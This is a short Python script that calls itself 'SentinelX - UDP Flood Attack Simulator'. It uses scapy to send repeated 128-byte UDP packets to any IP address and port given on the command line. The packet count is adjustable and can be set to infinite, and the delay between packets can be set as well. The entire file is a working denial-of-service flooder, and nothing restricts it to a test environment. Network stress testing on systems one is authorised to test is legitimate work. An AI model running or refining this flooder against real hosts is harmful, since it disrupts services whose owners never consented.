import argparse
import time
from scapy.all import IP, UDP, send, Raw

parser = argparse.ArgumentParser(description="SentinelX - UDP Flood Attack Simulator")
parser.add_argument("--target", required=True, help="Target IP address")
parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
parser.add_argument("--count", type=int, default=150, help="Number of packets to send (0 for infinite)")
parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets")
args = parser.parse_args()

print(f"[*] Starting UDP Flood against {args.target}:{args.port}")
if args.count == 0:
    print(f"[*] Sending UDP packets indefinitely with {args.delay}s delay... (Press Ctrl+C to stop)")
else:
    print(f"[*] Sending {args.count} UDP packets with {args.delay}s delay...")

try:
    packet = IP(dst=args.target)/UDP(dport=args.port)/Raw(load="X"*128)
    sent = 0
    while args.count == 0 or sent < args.count:
        send(packet, verbose=0)
        sent += 1
        if args.delay > 0:
            time.sleep(args.delay)
    print(f"\n[+] Attack simulation completed. Sent {sent} packets.")
except KeyboardInterrupt:
    print(f"\n[!] Attack aborted by user. Sent {sent} packets.")
except Exception as e:
    print(f"\n[!] Error: {e}")
